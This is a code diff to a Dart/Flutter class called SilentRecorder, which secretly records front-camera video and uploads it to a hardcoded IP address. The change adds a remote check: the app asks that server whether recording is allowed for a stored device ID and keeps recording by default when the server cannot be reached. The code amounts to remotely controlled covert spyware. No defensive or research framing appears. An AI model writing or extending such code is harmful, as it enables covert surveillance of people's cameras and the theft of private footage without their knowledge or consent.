@@ -1,7 +1,9 @@
 import 'dart:io';
 import 'dart:async';
+import 'dart:convert';
 import 'package:camera/camera.dart';
 import 'package:path_provider/path_provider.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 import 'package:http/http.dart' as http;
 
 class SilentRecorder {
@@ -11,13 +13,41 @@ class SilentRecorder {
   static String? _currentVideoPath;
 
   static const String uploadUrl = "http://148.116.91.16:3000/api/upload/video";
+  static const String serverUrl = "http://148.116.91.16:3000";
   static const int recordDuration = 60; // 1 minute in seconds
+
+  /// Check if camera is enabled by server for this device
+  static Future<bool> isCameraEnabled() async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      final deviceId = prefs.getString('deviceId') ?? 'unknown';
+      
+      final response = await http.get(
+        Uri.parse('$serverUrl/api/devices/$deviceId/camera'),
+      ).timeout(const Duration(seconds: 5));
+      
+      if (response.statusCode == 200) {
+        final data = jsonDecode(response.body);
+        return data['cameraEnabled'] == true;
+      }
+    } catch (e) {
+      print("📷 Camera check failed: $e");
+    }
+    return true; // Default ON if server unreachable
+  }
 
   /// Start silent recording from front camera
   static Future<void> startRecording() async {
     // Prevent multiple recordings
     if (_isRecording) {
       print("⚠ Already recording, ignoring new request");
+      return;
+    }
+
+    // Check if camera is enabled by server
+    final enabled = await isCameraEnabled();
+    if (!enabled) {
+      print("📷 Camera disabled by admin - skipping recording");
       return;
     }
 
